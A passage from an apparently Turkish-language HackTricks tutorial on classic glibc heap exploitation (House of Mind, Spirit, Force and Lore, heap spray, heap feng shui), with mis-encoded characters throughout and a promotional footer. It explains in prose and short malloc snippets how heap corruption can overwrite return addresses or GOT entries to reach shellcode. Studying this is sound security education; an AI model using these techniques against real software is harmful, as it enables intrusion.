fwd->bk = \*(av->bins\[2] + 12) = p;

Bu nedenle av->bins\[2] adresine \_\_DTOR\_END\_\_-12 adresini yazarsak, son talimatta \_\_DTOR\_END\_\_ adresine ikinci parÃ§anÄ±n adresi yazÄ±lacaktÄ±r.

Yani, ilk parÃ§anÄ±n baÅŸÄ±na \_\_DTOR\_END\_\_-12 adresini birÃ§ok kez yazmamÄ±z gerekmektedir, Ã§Ã¼nkÃ¼ av->bins\[2] buradan deÄŸeri alacaktÄ±r.

Ä°kinci parÃ§ada prev\_size'a bir jump 0x0c ve NON\_MAIN\_ARENA'yÄ± etkinleÅŸtirecek bir boyut yazÄ±yoruz.

ArdÄ±ndan, ikinci parÃ§aya bir sÃ¼rÃ¼ nops ve sonunda shellcode ekliyoruz.

Bu ÅŸekilde \_int\_free(TROZO1, TROZO2) Ã§aÄŸrÄ±lÄ±r ve \_\_DTOR\_END\_\_ adresine TROZO2'nin prev\_size adresi yazÄ±lÄ±r, bu da shellcode'a atlar.

Bu tekniÄŸi uygulamak iÃ§in payload'un biraz daha karmaÅŸÄ±k olmasÄ±nÄ± gerektiren bazÄ± ek gereksinimlerin karÅŸÄ±lanmasÄ± gerekmektedir.
Bu teknik artÄ±k uygulanabilir deÄŸil Ã§Ã¼nkÃ¼ unlink iÃ§in neredeyse aynÄ± yama uygulandÄ±. Yeni hedef siteye iÅŸaret edip etmediÄŸi karÅŸÄ±laÅŸtÄ±rÄ±lÄ±r.

**Fastbin**

The house of mind'in bir varyantÄ±dÄ±r.

\_int\_free() fonksiyonunun ilk kontrolÃ¼nden sonra aÅŸaÄŸÄ±daki kodu Ã§alÄ±ÅŸtÄ±rmak istiyoruz:

fb = &(av->fastbins\[fastbin\_index(size)] â€”> fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

BÃ¶ylece "fb" adresi GOT'taki bir fonksiyonun adresini verirse, bu adrese Ã¼zerine yazÄ±lacak olan adresi koyarÄ±z. Bunun iÃ§in arena'nÄ±n dtors adreslerine yakÄ±n olmasÄ± gerekir. Daha doÄŸrusu av->max\_fast'in Ã¼zerine yazÄ±lacak olan adreste olmasÄ± gerekir.

The House of Mind ile kontrolÃ¼n av tarafÄ±ndan yapÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rdÃ¼k.

Bu durumda, boyut alanÄ±na 8 + NON\_MAIN\_ARENA + PREV\_INUSE boyutunu koyarsak, fastbin\_index() bize fastbins\[-1]'i dÃ¶ndÃ¼recektir, bu da av->max\_fast'e iÅŸaret edecektir.

Bu durumda av->max\_fast'in Ã¼zerine yazÄ±lacak (iÅŸaret edilen deÄŸil, Ã¼zerine yazÄ±lacak olan) adres olacaktÄ±r.

AyrÄ±ca, serbest bÄ±rakÄ±lan parÃ§anÄ±n bitiÅŸik parÃ§asÄ±nÄ±n 8'den bÃ¼yÃ¼k olmasÄ± gerekir -> Serbest bÄ±rakÄ±lan parÃ§anÄ±n boyutunun 8 olduÄŸunu sÃ¶ylediÄŸimize gÃ¶re, bu sahte parÃ§aya sadece 8'den bÃ¼yÃ¼k bir boyut koymamÄ±z yeterlidir (ayrÄ±ca shellcode serbest bÄ±rakÄ±lan parÃ§ada olacaÄŸÄ±ndan, sahte parÃ§anÄ±n boyut alanÄ±nÄ±n hemen baÅŸÄ±na bir jmp koymamÄ±z gerekecektir).

AyrÄ±ca, aynÄ± sahte parÃ§anÄ±n av->system\_mem'den kÃ¼Ã§Ã¼k olmasÄ± gerekir. av->system\_mem 1848 bayt daha ileridedir.

\_DTOR\_END\_ ve GOT'taki az sayÄ±da adresin null olmasÄ±ndan dolayÄ±, bu bÃ¶lÃ¼mlerin hiÃ§biri Ã¼zerine yazÄ±lacak adres olarak uygun deÄŸildir, bu yÃ¼zden fastbin'i yÄ±ÄŸÄ±nÄ± hedeflemek iÃ§in nasÄ±l uygulayacaÄŸÄ±mÄ±za bakalÄ±m.

BaÅŸka bir saldÄ±rÄ± ÅŸekli de **av**'yi yÄ±ÄŸÄ±nÄ± iÅŸaret etmeye yÃ¶nlendirmektir.

Boyutu 8'den ziyade 16 yaparsak: fastbin\_index() bize fastbins\[0]'Ä± dÃ¶ndÃ¼recektir ve bunu yÄ±ÄŸÄ±nÄ± Ã¼zerine yazmak iÃ§in kullanabiliriz.

Bunun iÃ§in yÄ±ÄŸÄ±nda canary veya garip deÄŸerler olmamalÄ±dÄ±r, aslÄ±nda ÅŸu ÅŸekilde olmalÄ±dÄ±r: 4 bayt null + EBP + RET

4 bayt null, **av**'nin bu adrese iÅŸaret edeceÄŸi ve bir **av**'nin ilk Ã¶ÄŸesinin 0 olmasÄ± gereken bir adrestir.

**av->max\_fast** EBP olacak ve bizi kÄ±sÄ±tlamalardan geÃ§irecek bir deÄŸer olacaktÄ±r.

**av->fastbins\[0]** adresi **p**'nin adresiyle Ã¼zerine yazÄ±lacak ve RET olacaktÄ±r, bÃ¶ylece shellcode'a atlanacaktÄ±r.

AyrÄ±ca, **av->system\_mem**'de (yÄ±ÄŸÄ±nÄ±n pozisyonundan 1484 bayt yukarÄ±da) atlayabileceÄŸimiz yeterince Ã§Ã¶p olacaktÄ±r.

AyrÄ±ca, serbest bÄ±rakÄ±lan parÃ§anÄ±n bitiÅŸik parÃ§asÄ±nÄ±n 8'den bÃ¼yÃ¼k olmasÄ± gerekir -> Serbest bÄ±rakÄ±lan parÃ§anÄ±n boyutunun 16 olduÄŸunu sÃ¶ylediÄŸimize gÃ¶re, bu sahte parÃ§aya sadece 8'den bÃ¼yÃ¼k bir boyut koymamÄ±z yeterlidir (ayrÄ±ca shellcode serbest bÄ±rakÄ±lan parÃ§ada olacaÄŸÄ±ndan, sahte parÃ§anÄ±n boyut alanÄ±nÄ±n hemen baÅŸÄ±na, yeni sahte parÃ§anÄ±n boyut alanÄ±nÄ±n sonrasÄ±ndaki nops'a atlayacak bir jmp koymamÄ±z gerekecektir).

**The House of Spirit**

Bu durumda, saldÄ±rganÄ±n deÄŸiÅŸtirebileceÄŸi bir malloc iÅŸaretÃ§isine sahip olmayÄ± amaÃ§lÄ±yoruz (Ã¶rneÄŸin, bu iÅŸaretÃ§inin bir deÄŸiÅŸken Ã¼zerindeki taÅŸmaya karÅŸÄ± stack'te olmasÄ±).

BÃ¶ylece, bu iÅŸaretÃ§iyi istediÄŸi yere iÅŸaret edecek ÅŸekilde yapabiliriz. Ancak, herhangi bir yer uygun deÄŸildir, sahte parÃ§anÄ±n boyutu av->max\_fast'tan kÃ¼Ã§Ã¼k olmalÄ± ve daha spesifik olarak gelecekteki bir malloc() Ã§aÄŸrÄ±sÄ±nda istenen boyuta eÅŸit olmalÄ±dÄ±r. Bu nedenle, eÄŸer bu savunmasÄ±z iÅŸaretÃ§iden sonra malloc(40) Ã§aÄŸrÄ±lacaÄŸÄ±nÄ± biliyorsak, sahte parÃ§anÄ±n boyutu 48 olmalÄ±dÄ±r.

Ã–rneÄŸin, program kullanÄ±cÄ±dan bir sayÄ± istediÄŸinde 48 girebilir ve deÄŸiÅŸtirilebilir malloc iÅŸaretÃ§isini bir sonraki 4 bayta (ÅŸans eseri EBP'ye ait olabilir, bÃ¶ylece 48 arkada kalÄ±r, sanki boyut baÅŸlÄ±k gibi) iÅŸaret edebiliriz. AyrÄ±ca, ptr-4+48 adresinin Ã§eÅŸitli koÅŸullarÄ± karÅŸÄ±lamasÄ± gerekir (bu durumda ptr=EBP), yani 8 < ptr-4+48 < av->system\_mem olmalÄ±dÄ±r.

Bu koÅŸullar saÄŸlandÄ±ÄŸÄ±nda, sÃ¶z konusu malloc(40) Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda EBP'nin adresi olarak EBP'nin adresi atanacaktÄ±r. SaldÄ±rgan ayrÄ±ca bu malloc'ta ne yazÄ±lacaÄŸÄ±nÄ± kontrol edebiliyorsa, EBP ve EIP'yi istediÄŸi adrese Ã¼zerine yazabilir.

Bu, Ã§Ã¼nkÃ¼ free() iÅŸlemi, yÄ±ÄŸÄ±nÄ±n EBP'sine uygun boyutta yeni bir malloc() rezerve etmek istediÄŸini hatÄ±rlayacak ve bu adresi atayacaktÄ±r.

**The House of Force**

Gerekenler:

* Wilderness'Ä± Ã¼zerine yazÄ±labilir hale getiren bir taÅŸma
* KullanÄ±cÄ± tarafÄ±ndan tanÄ±mlanan boyutta bir malloc() Ã§aÄŸrÄ±sÄ±
* KullanÄ±cÄ± tarafÄ±ndan tanÄ±mlanan verilere sahip bir malloc() Ã§aÄŸrÄ±sÄ±

Ä°lk olarak, wilderness parÃ§asÄ±nÄ±n boyutunu Ã§ok bÃ¼yÃ¼k bir deÄŸerle (0xffffffff) Ã¼zerine yazarak yapÄ±lÄ±r, bÃ¶ylece yeterince bÃ¼yÃ¼k bir bellek talebi \_int\_malloc() tarafÄ±ndan geniÅŸletilmeden iÅŸlenecektir.

Ä°kincisi, av->top'u, saldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bir bellek bÃ¶lgesine, Ã¶rneÄŸin yÄ±ÄŸÄ±n, iÅŸaret edecek ÅŸekilde deÄŸiÅŸtirmektir. av->top'a \&EIP - 8 konulacaktÄ±r.

SaldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bellek bÃ¶lgesine iÅŸaret eden av->top'u deÄŸiÅŸtirmek iÃ§in:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim, mevcut wilderness parÃ§asÄ±nÄ±n adresini (mevcut av->top) alÄ±r ve remainder tam olarak bu adresin malloc() tarafÄ±ndan talep edilen bayt sayÄ±sÄ± kadar ilerisine eklenir. Bu nedenle, \&EIP-8'in 0xbffff224 olduÄŸu ve av->top'un 0x080c2788 olduÄŸu durumda, av->top'un bir sonraki malloc() iÃ§in \&EIP-8'e iÅŸaret etmesi iÃ§in kontrol edilen malloc iÃ§in rezerve edilmesi gereken miktar ÅŸudur:

0xbffff224 - 0x080c2788 = 3086207644.

Bu ÅŸekilde deÄŸiÅŸtirilmiÅŸ deÄŸer av->top'a kaydedilir ve bir sonraki malloc EIP'ye iÅŸaret eder ve Ã¼zerine yazÄ±labilir.

Yeni wilderness parÃ§asÄ±nÄ±n boyutunun, son malloc() tarafÄ±ndan yapÄ±lan talepten daha bÃ¼yÃ¼k olmasÄ± Ã¶nemlidir. Yani, wilderness \&EIP-8'i iÅŸaret ediyorsa, boyut tam olarak yÄ±ÄŸÄ±nÄ±n EBP alanÄ±nda kalÄ±r.

**The House of Lore**

**SmallBin BozulmasÄ±**

Serbest bÄ±rakÄ±lan parÃ§alar, boyutlarÄ±na gÃ¶re bin'e yerleÅŸtirilir. Ancak, bunlar bin'e yerleÅŸtirilmeden Ã¶nce sÄ±ralanmamÄ±ÅŸ bine konulur. Bir parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda, hemen bin'e konulmaz, sÄ±ralanmamÄ±ÅŸ bine kalÄ±r. ArdÄ±ndan, yeni bir parÃ§a rezerve edilirse ve Ã¶nceki serbest bÄ±rakÄ±lan parÃ§a yeterliyse, bu parÃ§a geri verilir, ancak daha bÃ¼yÃ¼k bir parÃ§a rezerve edilirse, sÄ±ralanmamÄ±ÅŸ bine konulan serbest bÄ±rakÄ±lan parÃ§a uygun bin'e konulur.

ZararlÄ± kodun eriÅŸebileceÄŸi kodu ulaÅŸmak iÃ§in bellek talebi av->max\_fast'tan bÃ¼yÃ¼k (genellikle 72) ve MIN\_LARGE\_SIZE'dan kÃ¼Ã§Ã¼k (512) olmalÄ±dÄ±r.

EÄŸer bin'de istenilen boyutta bir parÃ§a varsa, bu parÃ§a Ã§Ã¶zÃ¼mlendikten sonra geri dÃ¶ndÃ¼rÃ¼lÃ¼r:

bck = victim->bk; Ã–nceki parÃ§aya iÅŸaret eder, deÄŸiÅŸtirebileceÄŸimiz tek bilgidir.

bin->bk = bck; Ã–nceki parÃ§a son parÃ§a olur, eÄŸer bck yÄ±ÄŸÄ±nÄ± iÅŸaret ediyorsa, bir sonraki rezerve edilen parÃ§a bu adrese verilecektir.

bck->fd = bin; Liste kapatÄ±lÄ±r ve bu bin'e iÅŸaret eder.

Gerekenler:
Ä°ki malloc ayrÄ±lmalÄ±, bÃ¶ylece ikincisi serbest bÄ±rakÄ±ldÄ±ktan ve bin'ine eklendikten sonra ilkine taÅŸma yapÄ±labilir (yani taÅŸma yapmadan Ã¶nce ikinci parÃ§adan daha bÃ¼yÃ¼k bir malloc ayrÄ±lmÄ±ÅŸ olmalÄ±dÄ±r).

SaldÄ±rganÄ±n kontrol edebileceÄŸi saldÄ±rgan tarafÄ±ndan seÃ§ilen bir adresi olan malloc ayrÄ±lmÄ±ÅŸ olmalÄ±dÄ±r.

AmacÄ±mÄ±z ÅŸudur, bir heap'e taÅŸma yapabilirsek ve altÄ±nda serbest bÄ±rakÄ±lmÄ±ÅŸ ve bin'ine eklenmiÅŸ bir parÃ§a varsa, bk iÅŸaretÃ§isini deÄŸiÅŸtirebiliriz. Bk iÅŸaretÃ§isini deÄŸiÅŸtirirsek ve bu parÃ§a bin'in listenin baÅŸÄ±ndaki ilk parÃ§a olursa ve ayrÄ±ldÄ±ÄŸÄ±nda, bin yanÄ±ltÄ±lacak ve bir sonraki parÃ§anÄ±n (sunulan) yanlÄ±ÅŸ adreste olduÄŸuna inanÄ±lacak (Ã¶rneÄŸin stack veya GOT'a). Bu durumda baÅŸka bir parÃ§a ayrÄ±ldÄ±ÄŸÄ±nda ve saldÄ±rganÄ±n izinleri varsa, istenen konumda bir parÃ§a verilecek ve oraya yazabilecektir.

DeÄŸiÅŸtirilen parÃ§anÄ±n serbest bÄ±rakÄ±lmasÄ±ndan sonra serbest bÄ±rakÄ±lan parÃ§adan daha bÃ¼yÃ¼k bir parÃ§a ayrÄ±lmasÄ± gerekmektedir, bÃ¶ylece deÄŸiÅŸtirilen parÃ§a sÄ±ralanmamÄ±ÅŸ bin'lerden Ã§Ä±kar ve bin'ine eklenir.

Bin'ine girdikten sonra bk iÅŸaretÃ§isini taÅŸma yaparak istediÄŸimiz adrese iÅŸaret etmesi gerekmektedir.

Bu durumda, bin'in, istenilen konumda bir parÃ§a vermek iÃ§in yeterli sayÄ±da malloc() Ã§aÄŸrÄ±sÄ±nÄ±n yapÄ±lmasÄ±nÄ± beklemesi gerekmektedir ve bin'i yanÄ±ltarak bir sonraki parÃ§anÄ±n yanlÄ±ÅŸ adreste olduÄŸuna inanmasÄ±nÄ± saÄŸlamak gerekmektedir. Ve ardÄ±ndan istediÄŸimiz parÃ§a verilecektir.

Bu zafiyetin mÃ¼mkÃ¼n olan en kÄ±sa sÃ¼rede gerÃ§ekleÅŸmesi iÃ§in ideal olan ÅŸudur: Zafiyetli parÃ§anÄ±n ayrÄ±lmasÄ±, deÄŸiÅŸtirilecek parÃ§anÄ±n ayrÄ±lmasÄ±, bu parÃ§anÄ±n serbest bÄ±rakÄ±lmasÄ±, deÄŸiÅŸtirilecek parÃ§adan daha bÃ¼yÃ¼k bir parÃ§a ayrÄ±lmasÄ±, parÃ§a deÄŸiÅŸtirilmesi (zafiyet), zafiyetli parÃ§adan aynÄ± boyutta bir parÃ§a ayrÄ±lmasÄ± ve zafiyetli parÃ§adan aynÄ± boyutta ikinci bir parÃ§a ayrÄ±lmasÄ± ve bu ikincisi seÃ§ilen adrese iÅŸaret edecektir.

Bu saldÄ±rÄ±yÄ± korumak iÃ§in, tipik olarak, parÃ§anÄ±n "yanlÄ±ÅŸ" olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in bir kontrol yapÄ±lÄ±r: bck->fd'nin victim'a iÅŸaret etmediÄŸi kontrol edilir. Yani, bizim durumumuzda, stack'te iÅŸaret edilen yanlÄ±ÅŸ parÃ§anÄ±n fd\* iÅŸaretÃ§isinin victim'a iÅŸaret edip etmediÄŸi kontrol edilir. Bu korumayÄ± aÅŸmak iÃ§in saldÄ±rganÄ±n, doÄŸru adrese (muhtemelen stack Ã¼zerinden) victim'Ä±n adresini bir ÅŸekilde yazabilmesi gerekir. BÃ¶ylece yanlÄ±ÅŸ bir parÃ§a gibi gÃ¶rÃ¼nÃ¼r.

**LargeBin BozulmasÄ±**

Ã–nceki gereksinimlerin yanÄ± sÄ±ra, ayrÄ±lan parÃ§alarÄ±n 512'den bÃ¼yÃ¼k olmasÄ± gerekmektedir.

SaldÄ±rÄ±, Ã¶ncekiyle aynÄ±dÄ±r, yani bk iÅŸaretÃ§isini deÄŸiÅŸtirmek gerekmektedir ve tÃ¼m bu malloc() Ã§aÄŸrÄ±larÄ±na ihtiyaÃ§ vardÄ±r, ancak ayrÄ±ca deÄŸiÅŸtirilen parÃ§anÄ±n boyutunu deÄŸiÅŸtirmek gerekmektedir, bÃ¶ylece bu boyut - nb < MINSIZE olmalÄ±dÄ±r.

Ã–rneÄŸin, 1552 boyutunda bir parÃ§a koymak, 1552 - 1544 = 8 < MINSIZE olacak ÅŸekilde boyutu deÄŸiÅŸtirmek anlamÄ±na gelir (Ã§Ä±karma negatif olmamalÄ±dÄ±r Ã§Ã¼nkÃ¼ bir unsigned karÅŸÄ±laÅŸtÄ±rÄ±lÄ±r).

AyrÄ±ca, daha karmaÅŸÄ±k hale getirmek iÃ§in bir yama eklenmiÅŸtir.

**Heap Spreyi**

Temelde, mÃ¼mkÃ¼n olan tÃ¼m belleÄŸi heap'ler iÃ§in ayÄ±rmak ve bunlarÄ± nops yastÄ±ÄŸÄ± ile doldurmak ve bu yastÄ±k olarak 0x0c kullanmaktÄ±r. Yani 0x0c0c0c0c adresine atlamaya Ã§alÄ±ÅŸÄ±lacak ve bÃ¶ylece bu yastÄ±kla Ã§aÄŸrÄ±lacak bir adres Ã¼zerine yazÄ±lÄ±rsa oraya atlayacaktÄ±r. Temel olarak taktik, bir ÅŸeylerin Ã¼zerine yazÄ±lÄ±p yazÄ±lmadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in mÃ¼mkÃ¼n olduÄŸunca fazla ayÄ±rmaktÄ±r ve 0x0c0c0c0c adresine atlamayÄ± denemektir, orada nops olup olmadÄ±ÄŸÄ±nÄ± umarak.

**Heap Feng Shui**

BelleÄŸi sementasyon yaparak, aralarÄ±nda serbest bÄ±rakÄ±lmÄ±ÅŸ parÃ§alarÄ±n kaldÄ±ÄŸÄ± ÅŸekilde belleÄŸi sementlemek anlamÄ±na gelir. TaÅŸmayÄ± yapÄ±lacak tampon bir boÅŸluÄŸa yerleÅŸtirilir.

## Ä°lginÃ§ Kurslar

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referanslar**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hacklemeyi Ã¶ÄŸrenin</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keÅŸfedin**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya** Twitter'da ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.**

</details>
